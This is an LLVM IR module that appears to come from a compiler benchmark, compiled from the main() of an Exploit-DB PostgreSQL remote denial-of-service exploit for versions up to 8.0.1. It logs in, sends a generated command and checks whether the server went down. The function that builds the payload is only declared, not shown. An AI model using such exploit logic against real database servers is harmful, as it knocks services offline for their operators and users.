; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_946.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_946.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i32 }

@.str = private unnamed_addr constant [11 x i8] c"H:P:u:p:d:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i8* null, align 8
@DEFAULT_PORT = common dso_local global i8* null, align 8
@DEFAULT_DB = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [32 x i8] c"\09PostgreSQL Remote DoS <=8.0.1\0A\00", align 1
@.str.2 = private unnamed_addr constant [22 x i8] c"[*] Host/Port: %s/%s\0A\00", align 1
@.str.3 = private unnamed_addr constant [36 x i8] c"[*] DBname/User/Password: %s/%s/%s\0A\00", align 1
@CONNECTION_BAD = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [36 x i8] c"[-] Cannot connect to the database\0A\00", align 1
@.str.5 = private unnamed_addr constant [31 x i8] c"[+] Connected to the database\0A\00", align 1
@.str.6 = private unnamed_addr constant [32 x i8] c"[+] Command has been generated\0A\00", align 1
@str = common dso_local global i32 0, align 4
@PGRES_TUPLES_OK = common dso_local global i64 0, align 8
@.str.7 = private unnamed_addr constant [27 x i8] c"[+] Command has been sent\0A\00", align 1
@.str.8 = private unnamed_addr constant [30 x i8] c"[+] Server has been rebooted\0A\00", align 1
@.str.9 = private unnamed_addr constant [32 x i8] c"[-] Server hasnt been rebooted\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %7, align 8
  store i8* null, i8** %8, align 8
  store i8* null, i8** %9, align 8
  store i8* null, i8** %10, align 8
  store i8* null, i8** %11, align 8
  br label %15

15:                                               ; preds = %41, %2
  %16 = load i32, i32* %4, align 4
  %17 = load i8**, i8*** %5, align 8
  %18 = call signext i8 @getopt(i32 %16, i8** %17, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0))
  store i8 %18, i8* %6, align 1
  %19 = sext i8 %18 to i32
  %20 = load i8, i8* @EOF, align 1
  %21 = sext i8 %20 to i32
  %22 = icmp ne i32 %19, %21
  br i1 %22, label %23, label %42

23:                                               ; preds = %15
  %24 = load i8, i8* %6, align 1
  %25 = sext i8 %24 to i32
  switch i32 %25, label %36 [
    i32 72, label %26
    i32 80, label %28
    i32 117, label %30
    i32 112, label %32
    i32 100, label %34
  ]

26:                                               ; preds = %23
  %27 = load i8*, i8** @optarg, align 8
  store i8* %27, i8** %7, align 8
  br label %41

28:                                               ; preds = %23
  %29 = load i8*, i8** @optarg, align 8
  store i8* %29, i8** %8, align 8
  br label %41

30:                                               ; preds = %23
  %31 = load i8*, i8** @optarg, align 8
  store i8* %31, i8** %9, align 8
  br label %41

32:                                               ; preds = %23
  %33 = load i8*, i8** @optarg, align 8
  store i8* %33, i8** %10, align 8
  br label %41

34:                                               ; preds = %23
  %35 = load i8*, i8** @optarg, align 8
  store i8* %35, i8** %11, align 8
  br label %41

36:                                               ; preds = %23
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @usage(i8* %39)
  br label %41

41:                                               ; preds = %36, %34, %32, %30, %28, %26
  br label %15

42:                                               ; preds = %15
  %43 = load i8*, i8** %7, align 8
  %44 = icmp eq i8* %43, null
  br i1 %44, label %45, label %50

45:                                               ; preds = %42
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 0
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @usage(i8* %48)
  br label %50

50:                                               ; preds = %45, %42
  %51 = load i8*, i8** %9, align 8
  %52 = icmp eq i8* %51, null
  br i1 %52, label %53, label %58

53:                                               ; preds = %50
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 0
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @usage(i8* %56)
  br label %58

58:                                               ; preds = %53, %50
  %59 = load i8*, i8** %10, align 8
  %60 = icmp eq i8* %59, null
  br i1 %60, label %61, label %66

61:                                               ; preds = %58
  %62 = load i8**, i8*** %5, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 0
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 @usage(i8* %64)
  br label %66

66:                                               ; preds = %61, %58
  %67 = load i8*, i8** %8, align 8
  %68 = icmp eq i8* %67, null
  br i1 %68, label %69, label %71

69:                                               ; preds = %66
  %70 = load i8*, i8** @DEFAULT_PORT, align 8
  store i8* %70, i8** %8, align 8
  br label %71

71:                                               ; preds = %69, %66
  %72 = load i8*, i8** %11, align 8
  %73 = icmp eq i8* %72, null
  br i1 %73, label %74, label %76

74:                                               ; preds = %71
  %75 = load i8*, i8** @DEFAULT_DB, align 8
  store i8* %75, i8** %11, align 8
  br label %76

76:                                               ; preds = %74, %71
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0))
  %78 = load i8*, i8** %7, align 8
  %79 = load i8*, i8** %8, align 8
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0), i8* %78, i8* %79)
  %81 = load i8*, i8** %11, align 8
  %82 = load i8*, i8** %9, align 8
  %83 = load i8*, i8** %10, align 8
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.3, i64 0, i64 0), i8* %81, i8* %82, i8* %83)
  %85 = load i8*, i8** %7, align 8
  %86 = load i8*, i8** %8, align 8
  %87 = load i8*, i8** %11, align 8
  %88 = load i8*, i8** %9, align 8
  %89 = load i8*, i8** %10, align 8
  %90 = call i32* @PQsetdbLogin(i8* %85, i8* %86, i32* null, i32* null, i8* %87, i8* %88, i8* %89)
  store i32* %90, i32** %13, align 8
  %91 = load i32*, i32** %13, align 8
  %92 = call i64 @PQstatus(i32* %91)
  %93 = load i64, i64* @CONNECTION_BAD, align 8
  %94 = icmp eq i64 %92, %93
  br i1 %94, label %95, label %100

95:                                               ; preds = %76
  %96 = load i32*, i32** %13, align 8
  %97 = call i32 @PQfinish(i32* %96)
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.4, i64 0, i64 0))
  %99 = call i32 @exit(i32 1) #3
  unreachable

100:                                              ; preds = %76
  %101 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.5, i64 0, i64 0))
  %102 = call i32 (...) @make_str()
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0))
  %104 = load i32*, i32** %13, align 8
  %105 = load i32, i32* @str, align 4
  %106 = call i32* @PQexec(i32* %104, i32 %105)
  store i32* %106, i32** %14, align 8
  %107 = load i32*, i32** %14, align 8
  %108 = call i64 @PQresultStatus(i32* %107)
  %109 = load i64, i64* @PGRES_TUPLES_OK, align 8
  %110 = icmp eq i64 %108, %109
  br i1 %110, label %111, label %113

111:                                              ; preds = %100
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.7, i64 0, i64 0))
  br label %113

113:                                              ; preds = %111, %100
  %114 = load i32*, i32** %13, align 8
  %115 = call i64 @PQstatus(i32* %114)
  %116 = load i64, i64* @CONNECTION_BAD, align 8
  %117 = icmp eq i64 %115, %116
  br i1 %117, label %118, label %121

118:                                              ; preds = %113
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.8, i64 0, i64 0))
  %120 = call i32 @exit(i32 0) #3
  unreachable

121:                                              ; preds = %113
  %122 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.9, i64 0, i64 0))
  %123 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32* @PQsetdbLogin(i8*, i8*, i32*, i32*, i8*, i8*, i8*) #1

declare dso_local i64 @PQstatus(i32*) #1

declare dso_local i32 @PQfinish(i32*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @make_str(...) #1

declare dso_local i32* @PQexec(i32*, i32) #1

declare dso_local i64 @PQresultStatus(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
